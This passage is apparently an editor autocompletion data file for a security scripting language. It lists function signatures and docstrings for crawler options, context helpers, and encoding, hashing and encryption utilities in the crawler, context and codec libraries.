            functionName: "connectTimeout(${1:f /*type: float64*/})",
            document: "",
            definitionStr:
              'connectTimeout(f float64) ConfigOpt  doc:connectTimeout 是一个选项函数，用于指定爬虫时的连接超时时间，默认为10s\n\nExample:\n```\ncrawler.Start("https://example.com", crawler.connectTimeout(5))\n```\n',
          },
          {
            functionName: "concurrent(${1:concurrent /*type: int*/})",
            document: "",
            definitionStr:
              'concurrent(concurrent int) ConfigOpt  doc:concurrent 是一个选项函数，用于指定爬虫时的并发数，默认为20\n\nExample:\n```\ncrawler.Start("https://example.com", crawler.concurrent(10))\n```\n',
          },
          {
            functionName: "bodySize(${1:size /*type: int*/})",
            document: "",
            definitionStr:
              'bodySize(size int) ConfigOpt  doc:bodySize 是一个选项函数，用于指定爬虫时的最大响应体大小，默认为10MB\n\nExample:\n```\ncrawler.Start("https://example.com", crawler.bodySize(1024 * 1024))\n```\n',
          },
          {
            functionName:
              "basicAuth(${1:user /*type: string*/}, ${2:pass /*type: string*/})",
            document: "",
            definitionStr:
              'basicAuth(user string, pass string) ConfigOpt  doc:basicAuth 是一个选项函数，用于指定爬虫时的自动该填写的基础认证用户名和密码\n\nExample:\n```\ncrawler.Start("https://example.com", crawler.basicAuth("admin", "admin"))\n```\n',
          },
          {
            functionName:
              "autoLogin(${1:username /*type: string*/}, ${2:password /*type: string*/}, ${3:flags...})",
            document: "",
            definitionStr:
              'autoLogin(username string, password string, flags ...string) ConfigOpt  doc:autoLogin 是一个选项函数，用于指定爬虫时的自动填写可能存在的登录表单\n\nExample:\n```\ncrawler.Start("https://example.com", crawler.autoLogin("admin", "admin"))\n```\n',
          },
          {
            functionName: "Start(${1:url /*type: string*/}, ${2:opt...})",
            document: "",
            definitionStr:
              'Start(url string, opt ...ConfigOpt) (chan *Req, error)  doc:Start 启动爬虫爬取某个URL，它还可以接收零个到多个选项函数，用于影响爬取行为\n\n返回一个Req结构体引用管道与错误\n\nExample:\n```\nch, err := crawler.Start("https://www.baidu.com", crawler.concurrent(10))\nfor req in ch {\nprintln(req.Response()~)\n}\n```\n',
          },
          {
            functionName:
              "RequestsFromFlow(${1:isHttps /*type: bool*/}, ${2:reqBytes /*type: []byte*/}, ${3:rspBytes /*type: []byte*/})",
            document: "",
            definitionStr:
              "RequestsFromFlow(isHttps bool, reqBytes []byte, rspBytes []byte) ([][]byte, error)  doc:RequestsFromFlow 尝试从一次请求与响应中爬取出所有可能的请求，返回所有可能请求的原始报文与错误\n\nExample:\n```\nreqs, err = crawler.RequestsFromFlow(false, reqBytes, rspBytes)\n```\n",
          },
        ],
      },
      {
        libName: "context",
        prefix: "context.",
        functions: [
          {
            functionName:
              "WithValue(${1:parent /*type: context.Context*/}, ${2:key}, ${3:val})",
            document: "",
            definitionStr:
              'WithValue(parent context.Context, key any, val any) context.Context  doc:WithValue 返回继承自 parent ，同时额外携带键值的 Context 接口（即上下文接口）和取消函数\n\n当调用返回的取消函数时，整个上下文会被取消\n\nExample:\n```\nctx = context.WithValue(context.Background(), "key", "value")\nctx.Value("key") // "value"\n```\n',
          },
          {
            functionName: "WithTimeoutSeconds(${1:d /*type: float64*/})",
            document: "",
            definitionStr:
              "WithTimeoutSeconds(d float64) context.Context  doc:WithTimeoutSeconds 返回超时时间为 d 秒的 Context 接口（即上下文接口）\n\nExample:\n```\nctx = context.WithTimeoutSeconds(10)\n```\n",
          },
          {
            functionName:
              "WithTimeout(${1:parent /*type: context.Context*/}, ${2:timeout /*type: time.Duration*/})",
            document: "",
            definitionStr:
              'WithTimeout(parent context.Context, timeout time.Duration) (context.Context, context.CancelFunc)  doc:WithTimeout 返回继承自 parent 的 Context 接口（即上下文接口）和取消函数\n\n当调用返回的取消函数或者超时，整个上下文会被取消\n\nExample:\n```\ndur, err = time.ParseDuration("10s")\nctx, cancel := context.WithTimeout(context.Background(), dur)\ndefer cancel()\n```\n',
          },
          {
            functionName:
              "WithDeadline(${1:parent /*type: context.Context*/}, ${2:t /*type: time.Time*/})",
            document: "",
            definitionStr:
              'WithDeadline(parent context.Context, t time.Time) (context.Context, context.CancelFunc)  doc:WithDeadline 返回继承自 parent 的 Context 接口（即上下文接口）和取消函数\n\n当调用返回的取消函数或者超出指定时间，整个上下文会被取消\n\nExample:\n```\ndur, err = time.ParseDuration("10s")\nafter = time.Now().Add(dur)\nctx, cancel := context.WithDeadline(context.Background(), after)\ndefer cancel()\n```\n',
          },
          {
            functionName: "WithCancel(${1:parent /*type: context.Context*/})",
            document: "",
            definitionStr:
              "WithCancel(parent context.Context) (context.Context, context.CancelFunc)  doc:WithCancel 返回继承自 parent 的 Context 接口（即上下文接口）和取消函数\n\n当调用返回的取消函数或者 parent 的取消函数时，整个上下文会被取消\n\nExample:\n```\nctx, cancel = context.WithCancel(context.Background())\ndefer cancel()\n```\n",
          },
          {
            functionName: "Seconds(${1:d /*type: float64*/})",
            document: "",
            definitionStr:
              "Seconds(d float64) context.Context  doc:Seconds 返回一个超时时间为 d 秒的 Context 接口（即上下文接口）\n\n它实际是 context.WithTimeoutSeconds 的别名\n\nExample:\n```\nctx = context.Seconds(10)\n```\n",
          },
          {
            functionName: "New()",
            document: "",
            definitionStr:
              "New() context.Context  doc:New 返回空的 Context 接口（即上下文接口）\n\n它实际是 context.Background 的别名\n\nExample:\n```\nctx = context.New()\n```\n",
          },
          {
            functionName: "Background()",
            document: "",
            definitionStr:
              "Background() context.Context  doc:Background 返回空的 Context 接口（即上下文接口）\n\nExample:\n```\nctx = context.Background()\n```\n",
          },
        ],
      },
      {
        libName: "codec",
        prefix: "codec.",
        functions: [
          {
            functionName: "ZeroUnPadding(${1:originData /*type: []byte*/})",
            document: "",
            definitionStr: "ZeroUnPadding(originData []byte) []byte",
          },
          {
            functionName:
              "ZeroPadding(${1:origin /*type: []byte*/}, ${2:blockSize /*type: int*/})",
            document: "",
            definitionStr: "ZeroPadding(origin []byte, blockSize int) []byte",
          },
          {
            functionName: "UnicodeEncode(${1:i /*type: string*/})",
            document: "",
            definitionStr: "UnicodeEncode(i string) string",
          },
          {
            functionName: "UnicodeDecode(${1:i /*type: string*/})",
            document: "",
            definitionStr: "UnicodeDecode(i string) string",
          },
          {
            functionName: "UnescapeQueryUrl(${1:s /*type: string*/})",
            document: "",
            definitionStr: "UnescapeQueryUrl(s string) (string, error)",
          },
          {
            functionName: "UnescapePathUrl(${1:s /*type: string*/})",
            document: "",
            definitionStr: "UnescapePathUrl(s string) (string, error)",
          },
          {
            functionName: "UTF8ToHZGB2312(${1:s /*type: []byte*/})",
            document: "",
            definitionStr: "UTF8ToHZGB2312(s []byte) ([]byte, error)",
          },
          {
            functionName: "UTF8ToGBK(${1:s /*type: []byte*/})",
            document: "",
            definitionStr: "UTF8ToGBK(s []byte) ([]byte, error)",
          },
          {
            functionName: "UTF8ToGB18030(${1:s /*type: []byte*/})",
            document: "",
            definitionStr: "UTF8ToGB18030(s []byte) ([]byte, error)",
          },
          {
            functionName:
              "TripleDESEncrypt(${1:key /*type: []byte*/}, ${2:i}, ${3:iv /*type: []byte*/})",
            document: "",
            definitionStr:
              "TripleDESEncrypt(key []byte, i any, iv []byte) ([]byte any, error any)",
          },
          {
            functionName:
              "TripleDESECBEncrypt(${1:key /*type: []byte*/}, ${2:data /*type: []byte*/})",
            document: "",
            definitionStr:
              "TripleDESECBEncrypt(key []byte, data []byte) ([]byte, error)",
          },
          {
            functionName:
              "TripleDESECBDecrypt(${1:key /*type: []byte*/}, ${2:data /*type: []byte*/})",
            document: "",
            definitionStr:
              "TripleDESECBDecrypt(key []byte, data []byte) ([]byte, error)",
          },
          {
            functionName:
              "TripleDESDecrypt(${1:key /*type: []byte*/}, ${2:i}, ${3:iv /*type: []byte*/})",
            document: "",
            definitionStr:
              "TripleDESDecrypt(key []byte, i any, iv []byte) ([]byte any, error any)",
          },
          {
            functionName:
              "TripleDESCBCEncrypt(${1:key /*type: []byte*/}, ${2:i}, ${3:iv /*type: []byte*/})",
            document: "",
            definitionStr:
              "TripleDESCBCEncrypt(key []byte, i any, iv []byte) ([]byte any, error any)",
          },
          {
            functionName:
              "TripleDESCBCDecrypt(${1:key /*type: []byte*/}, ${2:i}, ${3:iv /*type: []byte*/})",
            document: "",
            definitionStr:
              "TripleDESCBCDecrypt(key []byte, i any, iv []byte) ([]byte any, error any)",
          },
          {
            functionName: "StrconvUnquote(${1:s /*type: string*/})",
            document: "",
            definitionStr:
              "StrconvUnquote(s string) (string, error)  doc:Unquote interprets s as a single-quoted, double-quoted,\nor backquoted Go string literal, returning the string value\nthat s quotes.  (If s is single-quoted, it would be a Go\ncharacter literal; Unquote returns the corresponding\none-character string.)\n",
          },
          {
            functionName: "StrconvQuote(${1:s /*type: string*/})",
            document: "",
            definitionStr: "StrconvQuote(s string) string",
          },
          {
            functionName:
              "Sm4OFBEncrypt(${1:key /*type: []byte*/}, ${2:i}, ${3:iv /*type: []byte*/})",
            document: "",
            definitionStr:
              "Sm4OFBEncrypt(key []byte, i any, iv []byte) ([]byte any, error any)",
          },
          {
            functionName:
              "Sm4OFBDecrypt(${1:key /*type: []byte*/}, ${2:i}, ${3:iv /*type: []byte*/})",
            document: "",
            definitionStr:
              "Sm4OFBDecrypt(key []byte, i any, iv []byte) ([]byte any, error any)",
          },
          {
            functionName:
              "Sm4GCMEncrypt(${1:key /*type: []byte*/}, ${2:data}, ${3:iv /*type: []byte*/})",
            document: "",
            definitionStr:
              "Sm4GCMEncrypt(key []byte, data any, iv []byte) ([]byte, error)  doc:\tfunc sm4encBase(data interface{}, key []byte, iv []byte, sm4ordinary func(key, in []byte, encode bool, iv []byte) ([]byte, error)) ([]byte, error) {\n\t\treturn sm4ordinary(key, interfaceToBytes(data), true, iv)\n\t}\n\n\tfunc sm4decBase(data interface{}, key []byte, iv []byte, sm4ordinary func(key, in []byte, encode bool, iv []byte) ([]byte, error)) ([]byte, error) {\n\t\treturn sm4ordinary(key, interfaceToBytes(data), false, iv)\n\t}\n\n\tfunc SM4CFBEnc(key []byte, data interface{}, iv []byte) ([]byte, error) {\n\t\treturn sm4encBase(data, key, iv, sm4.Sm4CFB)\n\t}\n\n\tfunc SM4CBCEnc(key []byte, data interface{}, iv []byte) ([]byte, error) {\n\t\treturn sm4encBase(data, key, iv, sm4.Sm4Cbc)\n\t}\n\n\tfunc SM4ECBEnc(key []byte, data interface{}, iv []byte) ([]byte, error) {\n\t\treturn sm4encBase(data, key, iv, sm4.Sm4Ecb)\n\t}\n\n\tfunc SM4OFBEnc(key []byte, data interface{}, iv []byte) ([]byte, error) {\n\t\treturn sm4encBase(data, key, iv, sm4.Sm4OFB)\n\t}\n\n\tfunc SM4CFBDec(key []byte, data interface{}, iv []byte) ([]byte, error) {\n\t\treturn sm4decBase(data, key, iv, sm4.Sm4CFB)\n\t}\n\n\tfunc SM4CBCDec(key []byte, data interface{}, iv []byte) ([]byte, error) {\n\t\treturn sm4decBase(data, key, iv, sm4.Sm4Cbc)\n\t}\n\n\tfunc SM4ECBDec(key []byte, data interface{}, iv []byte) ([]byte, error) {\n\t\treturn sm4decBase(data, key, iv, sm4.Sm4Ecb)\n\t}\n\n\tfunc SM4OFBDec(key []byte, data interface{}, iv []byte) ([]byte, error) {\n\t\treturn sm4decBase(data, key, iv, sm4.Sm4OFB)\n\t}\n",
          },
          {
            functionName:
              "Sm4GCMDecrypt(${1:key /*type: []byte*/}, ${2:data}, ${3:iv /*type: []byte*/})",
            document: "",
            definitionStr:
              "Sm4GCMDecrypt(key []byte, data any, iv []byte) ([]byte, error)",
          },
          {
            functionName:
              "Sm4ECBEncrypt(${1:key /*type: []byte*/}, ${2:i}, ${3:iv /*type: []byte*/})",
            document: "",
            definitionStr:
              "Sm4ECBEncrypt(key []byte, i any, iv []byte) ([]byte any, error any)",
          },
          {
            functionName:
              "Sm4ECBDecrypt(${1:key /*type: []byte*/}, ${2:i}, ${3:iv /*type: []byte*/})",
            document: "",
            definitionStr:
              "Sm4ECBDecrypt(key []byte, i any, iv []byte) ([]byte any, error any)",
          },
          {
            functionName:
              "Sm4EBCEncrypt(${1:key /*type: []byte*/}, ${2:i}, ${3:iv /*type: []byte*/})",
            document: "",
            definitionStr:
              "Sm4EBCEncrypt(key []byte, i any, iv []byte) ([]byte any, error any)",
          },
          {
            functionName:
              "Sm4EBCDecrypt(${1:key /*type: []byte*/}, ${2:i}, ${3:iv /*type: []byte*/})",
            document: "",
            definitionStr:
              "Sm4EBCDecrypt(key []byte, i any, iv []byte) ([]byte any, error any)",
          },
          {
            functionName:
              "Sm4CFBEncrypt(${1:key /*type: []byte*/}, ${2:i}, ${3:iv /*type: []byte*/})",
            document: "",
            definitionStr:
              "Sm4CFBEncrypt(key []byte, i any, iv []byte) ([]byte any, error any)",
          },
          {
            functionName:
              "Sm4CFBDecrypt(${1:key /*type: []byte*/}, ${2:i}, ${3:iv /*type: []byte*/})",
            document: "",
            definitionStr:
              "Sm4CFBDecrypt(key []byte, i any, iv []byte) ([]byte any, error any)",
          },
          {
            functionName:
              "Sm4CBCEncrypt(${1:key /*type: []byte*/}, ${2:i}, ${3:iv /*type: []byte*/})",
            document: "",
            definitionStr:
              "Sm4CBCEncrypt(key []byte, i any, iv []byte) ([]byte any, error any)",
          },
          {
            functionName:
              "Sm4CBCDecrypt(${1:key /*type: []byte*/}, ${2:i}, ${3:iv /*type: []byte*/})",
            document: "",
            definitionStr:
              "Sm4CBCDecrypt(key []byte, i any, iv []byte) ([]byte any, error any)",
          },
          {
            functionName: "Sm3(${1:raw})",
            document: "",
            definitionStr: "Sm3(raw any) []byte",
          },
          {
            functionName: "Sm2GeneratePemKeyPair()",
            document: "",
            definitionStr: "Sm2GeneratePemKeyPair() ([]byte, []byte, error)",
          },
          {
            functionName: "Sm2GenerateHexKeyPair()",
            document: "",
            definitionStr: "Sm2GenerateHexKeyPair() ([]byte, []byte, error)",
          },
          {
            functionName:
              "Sm2EncryptC1C3C2(${1:pubKey /*type: []byte*/}, ${2:data /*type: []byte*/})",
            document: "",
            definitionStr:
              "Sm2EncryptC1C3C2(pubKey []byte, data []byte) ([]byte, error)",
          },
          {
            functionName:
              "Sm2EncryptC1C2C3(${1:pubKey /*type: []byte*/}, ${2:data /*type: []byte*/})",
            document: "",
            definitionStr:
              "Sm2EncryptC1C2C3(pubKey []byte, data []byte) ([]byte, error)",
          },
          {
            functionName:
              "Sm2EncryptAsn1(${1:pubKey /*type: []byte*/}, ${2:data /*type: []byte*/})",
            document: "",
            definitionStr:
              "Sm2EncryptAsn1(pubKey []byte, data []byte) ([]byte, error)",
          },
          {
            functionName:
              "Sm2DecryptC1C3C2WithPassword(${1:priKey /*type: []byte*/}, ${2:data /*type: []byte*/}, ${3:password /*type: []byte*/})",
            document: "",
            definitionStr:
              "Sm2DecryptC1C3C2WithPassword(priKey []byte, data []byte, password []byte) ([]byte, error)",
          },
          {
            functionName:
              "Sm2DecryptC1C3C2(${1:priKey /*type: []byte*/}, ${2:data /*type: []byte*/})",
            document: "",
            definitionStr:
              "Sm2DecryptC1C3C2(priKey []byte, data []byte) ([]byte, error)",
          },
          {
            functionName:
              "Sm2DecryptC1C2C3WithPassword(${1:priKey /*type: []byte*/}, ${2:data /*type: []byte*/}, ${3:password /*type: []byte*/})",
            document: "",
            definitionStr:
              "Sm2DecryptC1C2C3WithPassword(priKey []byte, data []byte, password []byte) ([]byte, error)",
          },
          {
            functionName:
              "Sm2DecryptC1C2C3(${1:priKey /*type: []byte*/}, ${2:data /*type: []byte*/})",
            document: "",
            definitionStr:
              "Sm2DecryptC1C2C3(priKey []byte, data []byte) ([]byte, error)",
          },
          {
            functionName:
              "Sm2DecryptAsn1WithPassword(${1:priKey /*type: []byte*/}, ${2:data /*type: []byte*/}, ${3:password /*type: []byte*/})",
            document: "",
            definitionStr:
              "Sm2DecryptAsn1WithPassword(priKey []byte, data []byte, password []byte) ([]byte, error)",
          },
          {
            functionName:
              "Sm2DecryptAsn1(${1:priKey /*type: []byte*/}, ${2:data /*type: []byte*/})",
            document: "",
            definitionStr:
              "Sm2DecryptAsn1(priKey []byte, data []byte) ([]byte, error)",
          },
          {
            functionName: "Sha512(${1:i})",
            document: "",
            definitionStr: "Sha512(i any) string",
          },
          {
            functionName: "Sha384(${1:i})",
            document: "",
            definitionStr: "Sha384(i any) string",
          },
          {
            functionName: "Sha256(${1:i})",
            document: "",
            definitionStr: "Sha256(i any) string",
          },
          {
            functionName: "Sha224(${1:i})",
            document: "",
            definitionStr: "Sha224(i any) string",
          },
          {
            functionName: "Sha1(${1:i})",
            document: "",
            definitionStr: "Sha1(i any) string",
          },
          {
            functionName:
              "RSAEncryptWithPKCS1v15(${1:pemBytes /*type: []byte*/}, ${2:data})",
            document: "",
            definitionStr:
              'RSAEncryptWithPKCS1v15(pemBytes []byte, data any) ([]byte, error)  doc:EncryptWithPkcs1v15 将PEM格式的公钥与数据进行PKCS1v15加密，返回密文与错误\n\nExample:\n```\nenc, err := tls.EncryptWithPkcs1v15(pemBytes, "hello")\n```\n',
          },
          {
            functionName:
              "RSAEncryptWithOAEP(${1:pemBytes /*type: []byte*/}, ${2:data})",
            document: "",
            definitionStr:
              "RSAEncryptWithOAEP(pemBytes []byte, data any) ([]byte, error)",
          },
          {
            functionName:
              "RSADecryptWithPKCS1v15(${1:pemPriBytes /*type: []byte*/}, ${2:data})",
            document: "",
            definitionStr:
              "RSADecryptWithPKCS1v15(pemPriBytes []byte, data any) ([]byte, error)  doc:DecryptWithPkcs1v15 将PEM格式的私钥与密文进行PKCS1v15解密，返回明文与错误\n\nExample:\n```\ndec, err := tls.DecryptWithPkcs1v15(pemBytes, enc)\n```\n",
          },
          {
            functionName:
              "RSADecryptWithOAEP(${1:pemPriBytes /*type: []byte*/}, ${2:data})",
            document: "",
            definitionStr:
              "RSADecryptWithOAEP(pemPriBytes []byte, data any) ([]byte, error)",
          },
          {
            functionName:
              "RC4Encrypt(${1:cipherKey /*type: []byte*/}, ${2:plainText /*type: []byte*/})",
            document: "",
            definitionStr:
              "RC4Encrypt(cipherKey []byte, plainText []byte) ([]byte, error)",
          },
          {
            functionName:
              "RC4Decrypt(${1:cipherKey /*type: []byte*/}, ${2:cipherText /*type: []byte*/})",
            document: "",
            definitionStr:
              "RC4Decrypt(cipherKey []byte, cipherText []byte) ([]byte, error)",
          },
          {
            functionName: "PKCS7UnPaddingForDES(${1:src /*type: []byte*/})",
            document: "",
            definitionStr: "PKCS7UnPaddingForDES(src []byte) []byte",
          },
          {
            functionName: "PKCS7UnPadding(${1:src /*type: []byte*/})",
            document: "",
            definitionStr: "PKCS7UnPadding(src []byte) []byte",
          },
          {
            functionName: "PKCS7PaddingForDES(${1:src /*type: []byte*/})",
            document: "",
            definitionStr: "PKCS7PaddingForDES(src []byte) []byte",
          },
          {
            functionName: "PKCS7Padding(${1:src /*type: []byte*/})",
            document: "",
            definitionStr: "PKCS7Padding(src []byte) []byte",
          },
          {
            functionName: "PKCS5UnPadding(${1:origData /*type: []byte*/})",
            document: "",
            definitionStr: "PKCS5UnPadding(origData []byte) []byte",
          },
          {
            functionName:
              "PKCS5Padding(${1:ciphertext /*type: []byte*/}, ${2:blockSize /*type: int*/})",
            document: "",
            definitionStr:
              "PKCS5Padding(ciphertext []byte, blockSize int) []byte",
          },
          {
            functionName: "Md5(${1:i})",
            document: "",
            definitionStr: "Md5(i any) string",
          },
          {
            functionName: "MMH3Hash32(${1:i})",
            document: "",
            definitionStr: "MMH3Hash32(i any) int64",
          },
          {
            functionName: "MMH3Hash128x64(${1:i})",
            document: "",
            definitionStr: "MMH3Hash128x64(i any) string",
          },
          {
            functionName: "MMH3Hash128(${1:i})",
            document: "",
            definitionStr: "MMH3Hash128(i any) string",
          },
          {
            functionName: "HmacSha512(${1:key}, ${2:data})",
            document: "",
            definitionStr: "HmacSha512(key any, data any) []byte",
          },
          {
            functionName: "HmacSha256(${1:key}, ${2:data})",
            document: "",
            definitionStr: "HmacSha256(key any, data any) []byte",
          },
          {
            functionName: "HmacSha1(${1:key}, ${2:data})",
            document: "",
            definitionStr: "HmacSha1(key any, data any) []byte",
          },
          {
            functionName: "HmacSM3(${1:key}, ${2:data})",
            document: "",
            definitionStr: "HmacSM3(key any, data any) []byte",
          },
          {
            functionName: "HmacMD5(${1:key}, ${2:data})",
            document: "",
            definitionStr: "HmacMD5(key any, data any) []byte",
          },
          {
            functionName: "HZGB2312ToUTF8(${1:s /*type: []byte*/})",
            document: "",
            definitionStr: "HZGB2312ToUTF8(s []byte) ([]byte, error)",
          },
          {
            functionName: "HTMLChardetBest(${1:raw})",
            document: "",
            definitionStr: "HTMLChardetBest(raw any) (*chardet.Result, error)",
          },
          {
            functionName: "HTMLChardet(${1:raw})",
            document: "",
            definitionStr: "HTMLChardet(raw any) ([]chardet.Result, error)",
          },
          {
            functionName: "GBKToUTF8(${1:s /*type: []byte*/})",
            document: "",
            definitionStr: "GBKToUTF8(s []byte) ([]byte, error)",
          },
          {
            functionName: "GBKSafe(${1:s /*type: []byte*/})",
            document: "",
            definitionStr: "GBKSafe(s []byte) (string, error)",
          },
          {
            functionName: "GB18030ToUTF8(${1:s /*type: []byte*/})",
            document: "",
            definitionStr: "GB18030ToUTF8(s []byte) ([]byte, error)",
          },
          {
            functionName: "FixUTF8(${1:s /*type: []byte*/})",
            document: "",
            definitionStr: "FixUTF8(s []byte) string",
          },
          {
            functionName: "EscapeUrl(${1:s /*type: string*/})",
            document: "",
            definitionStr: "EscapeUrl(s string) string",
          },
          {
            functionName: "EscapeQueryUrl(${1:s /*type: string*/})",
            document: "",
            definitionStr: "EscapeQueryUrl(s string) string",
          },
          {
            functionName: "EscapePathUrl(${1:s /*type: string*/})",
            document: "",
            definitionStr:
              "EscapePathUrl(s string) string  doc:PathEscape escapes the string so it can be safely placed inside a URL path segment,\nreplacing special characters (including /) with %XX sequences as needed.\n",
          },
          {
            functionName: "EscapeHtml(${1:s /*type: string*/})",
            document: "",
            definitionStr:
              'EscapeHtml(s string) string  doc:EscapeString escapes special characters like "<" to become "&lt;". It\nescapes only five such characters: <, >, &, \' and ".\nUnescapeString(EscapeString(s)) == s always holds, but the converse isn\'t\nalways true.\n',
          },
          {
            functionName: "EncodeUrl(${1:i})",
            document: "",
            definitionStr: "EncodeUrl(i any) string",
          },
          {
            functionName: "EncodeToPrintable(${1:s /*type: string*/})",
            document: "",
            definitionStr: "EncodeToPrintable(s string) string",
          },
          {
            functionName: "EncodeToHex(${1:i})",
            document: "",
            definitionStr: "EncodeToHex(i any) string",
          },
          {
            functionName: "EncodeHtmlHex(${1:i})",
            document: "",
            definitionStr: "EncodeHtmlHex(i any) string",
          },
          {
            functionName: "EncodeHtml(${1:i})",
            document: "",
            definitionStr: "EncodeHtml(i any) string",
          },
          {
            functionName: "EncodeChunked(${1:raw /*type: []byte*/})",
            document: "",
            definitionStr: "EncodeChunked(raw []byte) []byte",
          },
          {
            functionName: "EncodeBase64Url(${1:i})",
            document: "",
            definitionStr: "EncodeBase64Url(i any) string",
          },
          {
            functionName: "EncodeBase64(${1:i})",
            document: "",
            definitionStr: "EncodeBase64(i any) string",
          },
          {
            functionName: "EncodeBase32(${1:i})",
            document: "",
            definitionStr: "EncodeBase32(i any) string",
          },
          {
            functionName: "EncodeASCII(${1:s /*type: string*/})",
            document: "",
            definitionStr: "EncodeASCII(s string) string",
          },
          {
            functionName: "DoubleEncodeUrl(${1:i})",
            document: "",
            definitionStr: "DoubleEncodeUrl(i any) string",
          },
          {
            functionName: "DoubleDecodeUrl(${1:i /*type: string*/})",
            document: "",
            definitionStr: "DoubleDecodeUrl(i string) (string any, error any)",
          },
          {
            functionName: "DecodeUrl(${1:s /*type: string*/})",
            document: "",
            definitionStr: "DecodeUrl(s string) (string, error)",
          },
          {
            functionName: "DecodeHtml(${1:s /*type: string*/})",
            document: "",
            definitionStr:
              'DecodeHtml(s string) string  doc:UnescapeString unescapes entities like "&lt;" to become "<". It unescapes a\nlarger range of entities than EscapeString escapes. For example, "&aacute;"\nunescapes to "á", as does "&#225;" and "&#xE1;".\nUnescapeString(EscapeString(s)) == s always holds, but the converse isn\'t\nalways true.\n',
          },
          {
            functionName: "DecodeHex(${1:i /*type: string*/})",
            document: "",
            definitionStr: "DecodeHex(i string) ([]byte, error)",
          },
          {
            functionName: "DecodeChunked(${1:raw /*type: []byte*/})",
            document: "",
            definitionStr: "DecodeChunked(raw []byte) ([]byte, error)",
          },
          {
            functionName: "DecodeBase64Url(${1:i})",
            document: "",
            definitionStr: "DecodeBase64Url(i any) ([]byte, error)",
          },
          {
            functionName: "DecodeBase64(${1:i /*type: string*/})",
            document: "",
            definitionStr: "DecodeBase64(i string) ([]byte, error)",
          },
          {
            functionName: "DecodeBase32(${1:i /*type: string*/})",
            document: "",
            definitionStr: "DecodeBase32(i string) ([]byte, error)",
          },
          {
            functionName: "DecodeASCII(${1:s /*type: string*/})",
            document: "",
            definitionStr:
              "DecodeASCII(s string) (string, error)  doc:Unquote interprets s as a single-quoted, double-quoted,\nor backquoted Go string literal, returning the string value\nthat s quotes.  (If s is single-quoted, it would be a Go\ncharacter literal; Unquote returns the corresponding\none-character string.)\n",
          },
          {
            functionName:
              "DESEncrypt(${1:key /*type: []byte*/}, ${2:i}, ${3:iv /*type: []byte*/})",
            document: "",
            definitionStr:
              "DESEncrypt(key []byte, i any, iv []byte) ([]byte any, error any)",
          },
          {
            functionName:
              "DESECBEncrypt(${1:key /*type: []byte*/}, ${2:data /*type: []byte*/})",
            document: "",
            definitionStr:
              "DESECBEncrypt(key []byte, data []byte) ([]byte, error)",
          },
          {
            functionName:
              "DESECBDecrypt(${1:key /*type: []byte*/}, ${2:data /*type: []byte*/})",
            document: "",
            definitionStr:
              "DESECBDecrypt(key []byte, data []byte) ([]byte, error)",
          },
          {
            functionName:
              "DESDecrypt(${1:key /*type: []byte*/}, ${2:i}, ${3:iv /*type: []byte*/})",
            document: "",
            definitionStr:
              "DESDecrypt(key []byte, i any, iv []byte) ([]byte any, error any)",
          },
          {
            functionName:
              "DESCBCEncrypt(${1:key /*type: []byte*/}, ${2:i}, ${3:iv /*type: []byte*/})",
            document: "",
            definitionStr:
              "DESCBCEncrypt(key []byte, i any, iv []byte) ([]byte any, error any)",
          },
          {
            functionName:
              "DESCBCDecrypt(${1:key /*type: []byte*/}, ${2:i}, ${3:iv /*type: []byte*/})",
            document: "",
            definitionStr:
              "DESCBCDecrypt(key []byte, i any, iv []byte) ([]byte any, error any)",
          },
          {
            functionName: "AutoDecode(${1:i})",
            document: "",
            definitionStr: "AutoDecode(i any) []*AutoDecodeResult",
          },
          {
            functionName:
              "AESGCMEncryptWithNonceSize16(${1:key /*type: []byte*/}, ${2:data}, ${3:nonceRaw /*type: []byte*/})",
            document: "",
            definitionStr:
              "AESGCMEncryptWithNonceSize16(key []byte, data any, nonceRaw []byte) ([]byte, error)  doc://AES GCM 加密后的payload shiro 1.4.2版本更换为了AES-GCM加密方式\n\n\tfunc AES_GCM_Encrypt(key []byte, Content []byte) string {\n\t\tblock, _ := aes.NewCipher(key)\n\t\tnonce := make([]byte, 16)\n\t\tio.ReadFull(rand.Reader, nonce)\n\t\taesgcm, _ := cipher.NewGCMWithNonceSize(block, 16)\n\t\tciphertext := aesgcm.Seal(nil, nonce, Content, nil)\n\t\treturn base64.StdEncoding.EncodeToString(append(nonce, ciphertext...))\n\t}\n",
          },
          {
            functionName:
              "AESGCMEncryptWithNonceSize12(${1:key /*type: []byte*/}, ${2:data}, ${3:nonceRaw /*type: []byte*/})",
            document: "",
            definitionStr:
              "AESGCMEncryptWithNonceSize12(key []byte, data any, nonceRaw []byte) ([]byte, error)",
          },
          {
            functionName:
              "AESGCMEncrypt(${1:key /*type: []byte*/}, ${2:data}, ${3:nonceRaw /*type: []byte*/})",
            document: "",
            definitionStr:
              "AESGCMEncrypt(key []byte, data any, nonceRaw []byte) ([]byte, error)  doc://AES GCM 加密后的payload shiro 1.4.2版本更换为了AES-GCM加密方式\n\n\tfunc AES_GCM_Encrypt(key []byte, Content []byte) string {\n\t\tblock, _ := aes.NewCipher(key)\n\t\tnonce := make([]byte, 16)\n\t\tio.ReadFull(rand.Reader, nonce)\n\t\taesgcm, _ := cipher.NewGCMWithNonceSize(block, 16)\n\t\tciphertext := aesgcm.Seal(nil, nonce, Content, nil)\n\t\treturn base64.StdEncoding.EncodeToString(append(nonce, ciphertext...))\n\t}\n",
          },
          {
            functionName:
              "AESGCMDecryptWithNonceSize16(${1:key /*type: []byte*/}, ${2:data}, ${3:nonce /*type: []byte*/})",
            document: "",
            definitionStr:
              "AESGCMDecryptWithNonceSize16(key []byte, data any, nonce []byte) ([]byte, error)",
          },
          {
            functionName:
              "AESGCMDecryptWithNonceSize12(${1:key /*type: []byte*/}, ${2:data}, ${3:nonce /*type: []byte*/})",
            document: "",
            definitionStr:
              "AESGCMDecryptWithNonceSize12(key []byte, data any, nonce []byte) ([]byte, error)",
          },
          {
            functionName:
              "AESGCMDecrypt(${1:key /*type: []byte*/}, ${2:data}, ${3:nonce /*type: []byte*/})",
            document: "",
            definitionStr:
              "AESGCMDecrypt(key []byte, data any, nonce []byte) ([]byte, error)",
          },
          {
            functionName:
              "AESEncrypt(${1:key /*type: []byte*/}, ${2:i}, ${3:iv /*type: []byte*/})",
            document: "",
            definitionStr:
              "AESEncrypt(key []byte, i any, iv []byte) ([]byte any, error any)",
          },
          {
            functionName:
              "AESECBEncryptWithZeroPadding(${1:key /*type: []byte*/}, ${2:i}, ${3:iv /*type: []byte*/})",
            document: "",
            definitionStr:
              "AESECBEncryptWithZeroPadding(key []byte, i any, iv []byte) ([]byte any, error any)",
          },
          {
            functionName:
